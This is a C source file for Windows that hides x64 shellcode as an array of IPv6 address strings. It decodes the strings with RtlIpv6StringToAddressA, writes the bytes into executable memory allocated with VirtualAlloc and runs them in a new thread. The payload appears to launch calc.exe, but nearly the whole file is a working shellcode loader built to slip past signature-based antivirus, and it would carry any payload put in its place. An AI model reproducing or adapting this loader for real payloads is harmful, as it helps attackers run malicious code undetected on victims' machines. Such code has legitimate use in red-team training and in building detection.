#include <Windows.h>
#include <stdio.h>

// --- Deobfuscating IPv6 ---
typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA) (
	PCSTR      S,
	PCSTR      terminator,
	PVOID      Addr
	);

BOOL IPv6Decoded(IN CHAR* IPv6Array[], IN SIZE_T NumOfElements, OUT PBYTE* ppDAddress,
	OUT SIZE_T* pDSize) {
	PBYTE	 pBuffer     = NULL;
	PBYTE    tmpBuffer   = NULL;
	SIZE_T	 sBufferSize = 0;
	PCSTR    terminator  = NULL;
	NTSTATUS STATUS		 = 0;

	// retrieve handle to ntdll.dll
	HMODULE hNTmodule = GetModuleHandle(TEXT("ntdll.dll"));
	if (hNTmodule == NULL) {
		printf("[!] GetModuleHandle failed: %d\n", GetLastError());
		return FALSE;
	}

	// find the addr of func RtlIpv6StringToAddressA in ntdll.dll
	fnRtlIpv6StringToAddressA pIpv6StringToAddressA = NULL;
	FARPROC NTprocAddr = GetProcAddress(hNTmodule, "RtlIpv6StringToAddressA");
	if (NTprocAddr == NULL) {
		printf("[!] GetProcAddress failed: %d\n", GetLastError());
		return FALSE;
	}
	pIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)NTprocAddr;

	// retrieve the actual size of the shellcode
	sBufferSize = NumOfElements * 16;

	// Allocate mem using number of bytes in the address to hold the deob address
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBufferSize);
	if (pBuffer == NULL) {
		printf("[!] memory allocating failed: %d \n: ", GetLastError());
		return FALSE;
	}

	tmpBuffer = pBuffer;
	// iterate through IPv6 addr in IPv6Array
	for (int i = 0; i < NumOfElements; i++) {
		// IPv6Array[i] is a single IPv6 addr from the IPv6 array
		if ((STATUS = pIpv6StringToAddressA(IPv6Array[i], &terminator, tmpBuffer))
			!= 0x0) {
			printf("[!] RtlIpv6StringToAddressA failed at [%s] with error 0x%08X\n",
				IPv6Array[i], STATUS);
			return FALSE;
		}
		// 16 bytes are written at a time so tmpBuffer will need to be updated at 16 byte increments
		tmpBuffer = (PBYTE)(tmpBuffer + 16);
	}
	// Save addr and size of deob payload
	*ppDAddress = pBuffer;
	*pDSize = sBufferSize;
	return TRUE;
}

char* IPv6Array[18] = {
		"FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", 
		"2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0", "AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED",
		"5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844", 
		"8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1",
		"38E0:75F1:4C03:4C24:0845:39D1:75D8:5844", "8B40:2449:01D0:6641:8B0C:4844:8B40:1C49", 
		"01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",
		"595A:488B:12E9:57FF:FFFF:5D48:BA01:0000", "0000:0000:0048:8D8D:0101:0000:41BA:318B", 
		"6F87:FFD5:BBF0:B5A2:5641:BAA6:95BD:9DFF", "D548:83C4:283C:067C:0A80:FBE0:7505:BB47",
		"1372:6F6A:0059:4189:DAFF:D563:616C:632E", "6578:6500:9090:9090:9090:9090:9090:9090"
};

int main() {
	// number of IPv6 strings in the array 
	SIZE_T NumOfElements = sizeof(IPv6Array) / sizeof(IPv6Array[0]);
	
	PBYTE pShellcode = NULL;
	SIZE_T ShellcodeSize = 0; 

	if (!IPv6Decoded(IPv6Array, NumOfElements, &pShellcode, &ShellcodeSize)) {
		printf("[!] Decoding failed\n"); 
		return 1; 
	}

	// Allocate executable memory 
	PVOID pExeMemory = VirtualAlloc(NULL, ShellcodeSize, MEM_COMMIT | 
		MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
	if (pExeMemory == NULL) {
		printf("[!] VirtualAlloc failed: %d\n", GetLastError()); 
		HeapFree(GetProcessHeap(), 0, pShellcode); 
		return 1; 
	};

	// print size and address of shellcode 
	printf("[+] Shellcode decoded: %zu bytes at %p\n", ShellcodeSize, pShellcode);

	// copy shellcode into the newly created memory and free it
	memcpy(pExeMemory, pShellcode, ShellcodeSize); 
	HeapFree(GetProcessHeap(), 0, pShellcode); 
	
	// execute shellcode via CreateThread()
	HANDLE hExeThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExeMemory, NULL, 0, NULL);
	if (hExeThread == NULL) {
		printf("[!] CreateThread failed: %d\n", GetLastError());
		return 1;
	} 

	// wait for thread to execute shellcode and then close the handle 
	WaitForSingleObject(hExeThread, INFINITE);
	CloseHandle(hExeThread); 

	printf("[#] press enter to quit\n");
	(void)getchar();
	return 0;
}